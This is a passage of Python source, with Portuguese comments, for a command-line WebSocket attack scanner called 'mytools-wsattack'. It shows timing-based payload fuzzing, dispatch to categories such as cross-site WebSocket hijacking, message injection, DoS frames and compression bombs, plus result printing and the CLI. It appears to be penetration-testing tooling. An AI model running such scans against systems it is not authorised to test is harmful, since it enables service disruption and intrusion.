                _send_ws_frame(sock, WS_OPCODE_TEXT, payload_str.encode(), mask=True)
                _recv_ws_frame(sock, timeout)
                elapsed = time.monotonic() - t0

                if elapsed >= timing_threshold and elapsed >= baseline_elapsed + 1.0:
                    results.append(
                        WSAttackAttempt(
                            technique=f"{technique}_timing",
                            category="ws_payload_fuzz",
                            description=f"{desc} (timing: {elapsed:.1f}s)",
                            status_baseline=b_status,
                            status_test=200,
                            size_baseline=b_size,
                            size_test=0,
                            vulnerable=True,
                            details=f"Response took {elapsed:.1f}s (threshold: {timing_threshold}s)",
                            error="",
                        )
                    )
            finally:
                sock.close()

    return results


# ─── Dispatch ────────────────────────────────────────────────────────────────


_CATEGORY_DISPATCH: dict[
    str, Callable[..., Coroutine[Any, Any, list[WSAttackAttempt]]]
] = {
    "ws_scanner": _test_ws_scanner,
    "ws_upgrade_abuse": _test_ws_upgrade_abuse,
    "ws_message_inject": _test_ws_message_inject,
    "ws_dos": _test_ws_dos,
    "ws_compression_bomb": _test_ws_compression_bomb,
    "ws_payload_fuzz": _test_ws_payload_fuzz,
}


# ─── Print Results ───────────────────────────────────────────────────────────


def print_results(result: WSAttackResult) -> None:
    """Imprime resultados formatados no terminal."""

    print()

    print(color("[*]", Cyber.CYAN, Cyber.BOLD), "WebSocket Security Test")

    print(color("[*]", Cyber.CYAN), f"Target: {result.target}")

    print(
        color("[*]", Cyber.CYAN),
        f"Host: {result.host}:{result.port} (TLS: {result.tls})",
    )

    print(
        color("[*]", Cyber.CYAN),
        f"Baseline: HTTP {result.baseline_status} ({result.baseline_size} bytes)",
    )

    print()

    if result.issues:
        print(color("[!]", Cyber.YELLOW, Cyber.BOLD), "Issues:")

        for issue in result.issues:
            print(color("    -", Cyber.YELLOW), issue)

        print()

    categories: dict[str, list[WSAttackAttempt]] = {}

    for attempt in result.attempts:
        categories.setdefault(attempt.category, []).append(attempt)

    for cat, attempts in categories.items():
        vuln_in_cat = [a for a in attempts if a.vulnerable]

        if vuln_in_cat:
            print(
                color("[!]", Cyber.RED, Cyber.BOLD),
                f"{cat}: {len(vuln_in_cat)} vulnerable(s)",
            )

            for a in vuln_in_cat:
                print(color("    [-]", Cyber.RED), f"{a.technique}: {a.details}")

                print_exploit_info(a.exploit, a.tool)

        else:
            print(color("[+]", Cyber.GREEN), f"{cat}: secure")

    print()

    if result.overall_status == "vulnerable":
        print(
            color("[!]", Cyber.RED, Cyber.BOLD),
            "VULNERABLE — WebSocket vulnerabilities detected!",
        )

    else:
        print(
            color("[+]", Cyber.GREEN, Cyber.BOLD),
            "SECURE — No WebSocket vulnerabilities detected",
        )

    print()


# ─── Main Scan ───────────────────────────────────────────────────────────────


async def run_scan(
    target: str,
    categories: list[str] | None,
    timeout: float,
    output_file: str | None,
) -> WSAttackResult:
    """Executa scan de WebSocket Security."""

    host, path, port, tls = _parse_url(target)

    b_status, b_size = _get_baseline(host, port, path, timeout, tls)

    all_attempts: list[WSAttackAttempt] = []

    cats = categories if categories is not None else list(_CATEGORY_MAP.keys())

    for cat in cats:
        tester = _CATEGORY_DISPATCH.get(cat)

        if tester is None:
            continue

        try:
            raw = await tester(host, port, path, timeout, tls, b_status, b_size)

            all_attempts.extend(raw)

        except Exception as e:
            all_attempts.append(
                WSAttackAttempt(
                    technique=f"{cat}_error",
                    category=cat,
                    description="",
                    status_baseline=b_status,
                    status_test=0,
                    size_baseline=b_size,
                    size_test=0,
                    vulnerable=False,
                    details="",
                    error=str(e)[:100],
                )
            )

    vuln_techs = [a.technique for a in all_attempts if a.vulnerable]

    issue_techs = [a.technique for a in all_attempts if a.error and not a.vulnerable]

    issues = [f"Errors: {', '.join(issue_techs)}"] if issue_techs else []

    overall = "vulnerable" if vuln_techs else "secure"

    result = WSAttackResult(
        target=target,
        host=host,
        port=port,
        tls=tls,
        baseline_status=b_status,
        baseline_size=b_size,
        attempts=all_attempts,
        vulnerable_techniques=vuln_techs,
        issues=issues,
        overall_status=overall,
    )

    print_results(result)

    if output_file:
        write_output(output_file, [asdict(a) for a in all_attempts])

    return result


# ─── CLI ─────────────────────────────────────────────────────────────────────


def build_parser() -> argparse.ArgumentParser:
    """Constrói parser de argumentos CLI."""

    parser = argparse.ArgumentParser(
        prog="mytools-wsattack",
        description="WebSocket Security — CSWSH, Upgrade Abuse, Message Inject, DoS, Compression Bomb, Payload Fuzzing",
    )

    parser.add_argument("url", help="URL alvo (ws:// ou wss://)")

    parser.add_argument(
        "-c",
        "--categories",
        nargs="+",
        choices=list(_CATEGORY_MAP.keys()),
        help="Categorias para testar (default: todas)",
    )

    add_common_args(parser, "web")

    return parser


def run_once(args: argparse.Namespace) -> int:
    """Executa scan uma vez."""

    result = safe_asyncio_run(
        run_scan(
            target=args.url,
            categories=getattr(args, "categories", None),
            timeout=getattr(args, "timeout", 5.0),
            output_file=getattr(args, "output", None),
        )
    )

    return 1 if result.overall_status == "vulnerable" else 0


def main() -> int:
    """Entry point principal."""

    return run_main_loop(
        parser=build_parser(),
        banner_fn=create_banner(_BANNER_LINES, "WebSocket Security"),
        run_fn=run_once,
        has_target=lambda a: bool(getattr(a, "url", None)),
        prompt="wsattack> ",
        description="Teste de WebSocket Security (CSWSH, Upgrade Abuse, Message Inject, DoS, Compression Bomb).",
        example="wss://target.com/ws -c ws_scanner ws_dos",
        contextual_help=(
            "Categorias disponiveis:\n"
            "  ws_scanner          — CSWSH, hijacking, info leak\n"
            "  ws_upgrade_abuse    — Forcar upgrade em endpoints nao-WS\n"
            "  ws_message_inject   — Injecao de mensagens\n"
            "  ws_dos              — DoS via frames maliciosos\n"
            "  ws_compression_bomb — Compression bomb"
        ),
    )


if __name__ == "__main__":
    raise SystemExit(main())
